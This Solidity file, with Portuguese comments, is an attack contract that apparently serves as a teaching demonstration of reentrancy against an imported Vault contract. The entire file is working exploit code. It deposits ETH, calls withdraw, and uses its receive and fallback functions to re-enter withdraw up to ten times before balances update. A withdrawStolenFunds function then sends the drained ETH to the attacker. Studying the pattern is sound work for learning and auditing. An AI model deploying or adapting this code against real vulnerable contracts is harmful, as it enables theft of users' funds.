// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Vault.sol";

/**
 * @title Attack
 * @dev Contrato malicioso que explora a vulnerabilidade de reentrância no Vault
 * @author Ricardo Silva
 * @notice Este contrato demonstra como um ataque de reentrância funciona
 */
contract Attack {
    Vault public vault;
    address public owner;
    
    // Contador para evitar loop infinito
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = 10;
    
    // Eventos
    event AttackStarted(uint256 initialBalance);
    event ReentrancyExecuted(uint256 amount, uint256 count);
    event AttackCompleted(uint256 totalStolen);
    
    constructor(address payable _vaultAddress) {
        vault = Vault(_vaultAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev Inicia o ataque depositando ETH e depois sacando
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        require(address(vault).balance >= 1 ether, "Vault is empty");
        
        emit AttackStarted(address(vault).balance);
        
        // Passo 1: Depositar ETH no vault
        vault.deposit{value: msg.value}();
        
        // Passo 2: Iniciar o saque (isso vai disparar o receive/fallback)
        vault.withdraw();
    }
    
    /**
     * @dev Função receive que é chamada quando o Vault envia ETH
     * Aqui está a mágica do ataque de reentrância!
     */
    receive() external payable {
        // Verifica se ainda podemos atacar
        if (attackCount < MAX_ATTACKS && address(vault).balance > 0) {
            attackCount++;
            
            emit ReentrancyExecuted(msg.value, attackCount);
            
            // Reentra no vault chamando withdraw novamente
            // antes que o Vault atualize nosso balance!
            vault.withdraw();
        }
    }
    
    /**
     * @dev Função fallback para compatibilidade
     */
    fallback() external payable {
        // Mesma lógica do receive
        if (attackCount < MAX_ATTACKS && address(vault).balance > 0) {
            attackCount++;
            emit ReentrancyExecuted(msg.value, attackCount);
            vault.withdraw();
        }
    }
    
    /**
     * @dev Retira todo o ETH roubado para o endereço do atacante
     */
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner");
        
        uint256 stolenAmount = address(this).balance;
        require(stolenAmount > 0, "No funds to withdraw");
        
        emit AttackCompleted(stolenAmount);
        
        (bool success, ) = owner.call{value: stolenAmount}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @dev Retorna o balance do contrato de ataque
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Retorna o número de ataques executados
     */
    function getAttackCount() external view returns (uint256) {
        return attackCount;
    }
}
